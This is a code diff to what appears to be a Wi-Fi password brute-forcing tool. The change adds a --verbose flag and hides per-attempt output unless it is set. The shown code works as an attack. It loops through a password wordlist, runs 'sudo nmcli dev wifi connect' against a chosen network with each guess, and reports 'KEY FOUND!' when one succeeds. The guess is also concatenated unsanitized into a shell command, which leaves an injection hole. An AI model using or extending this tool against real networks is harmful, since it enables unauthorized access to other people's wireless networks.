@@ -44,6 +44,12 @@ def argument_parser():
         default=None,
         help='The file that contains the list of passwords'
     )
+    
+    parser.add_argument(
+    	'-v', '--verbose',
+    	action='store_true',
+    	help='Optional: Use to show all passwords attempted, rather than just the successful one.'
+    )
 
     return parser.parse_args()
 
@@ -122,7 +128,7 @@ def prompt_for_target_choice(max):
 """
 
 
-def brute_force(selected_network, passwords):
+def brute_force(selected_network, passwords, args):
     for password in passwords:
         # necessary due to NetworkManager restart after unsuccessful attempt at login
         password = password.strip()
@@ -132,26 +138,30 @@ def brute_force(selected_network, passwords):
             decoded_line = password
         else:
             decoded_line = password.decode("utf-8")
-
-        print(bcolors.HEADER+"** TESTING **: with password '" +
-              decoded_line+"'"+bcolors.ENDC)
+            
+        if args.verbose is True:
+            print(bcolors.HEADER+"** TESTING **: with password '" +
+                decoded_line+"'"+bcolors.ENDC)
 
         if (len(decoded_line) >= 8):
             time.sleep(3)
 
             creds = os.popen("sudo nmcli dev wifi connect " +
-                             selected_network+" password "+decoded_line).read()
+                selected_network+" password "+decoded_line).read()
+                
             # print(creds)
 
             if ("Error:" in creds.strip()):
-                print(bcolors.FAIL+"** TESTING **: password '" +
-                      decoded_line+"' failed."+bcolors.ENDC)
+            	if args.verbose is True:
+                    print(bcolors.FAIL+"** TESTING **: password '" +
+                        decoded_line+"' failed."+bcolors.ENDC)
             else:
-                sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
-                         decoded_line+"' succeeded."+bcolors.ENDC)
+            	sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
+                    decoded_line+"' succeeded."+bcolors.ENDC)
         else:
-            print(bcolors.OKCYAN+"** TESTING **: password '" +
-                  decoded_line+"' too short, passing."+bcolors.ENDC)
+            if args.verbose is True:
+                print(bcolors.OKCYAN+"** TESTING **: password '" +
+                    decoded_line+"' too short, passing."+bcolors.ENDC)
 
     print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)
 
@@ -194,8 +204,10 @@ def main():
     max = len(networks)
     pick = prompt_for_target_choice(max)
     target = networks[pick]
+    
+    print("\nWifi-bf is running. If you would like to see passwords being tested in realtime, enable the [--verbose] flag at start.")
 
-    brute_force(target, passwords)
+    brute_force(target, passwords, args)
 
 
 main()
